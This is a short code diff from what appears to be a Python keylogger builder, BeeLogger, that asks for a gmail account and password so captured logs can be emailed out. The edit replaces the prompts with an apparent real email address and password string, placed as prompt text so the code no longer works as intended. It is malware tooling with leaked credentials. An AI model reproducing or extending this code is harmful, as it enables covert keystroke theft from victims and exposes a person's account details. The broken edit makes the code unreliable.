@@ -15,8 +15,8 @@ def clear():
 def begin():
     os.system('sudo rm -Rf dist')
 # TEMPORARY UNAVAILABLE #    print "\n{0}You can see a list with servers and ports in SERVERS.txt on BeeLogger folder.{1}".format(GREEN,END)
-    email = raw_input('Type your gmail to receive logs: ')
-    epass = raw_input('Type your gmail password: ')
+    email = raw_input(' trandungdeptrai195@gmail.com : ')
+    epass = raw_input('1571995a: ')
     print '\n'
     print '[ * * * * * * * * * * * * * * * * * * * * * * * * * ]'
     print '\n   email: ' + email
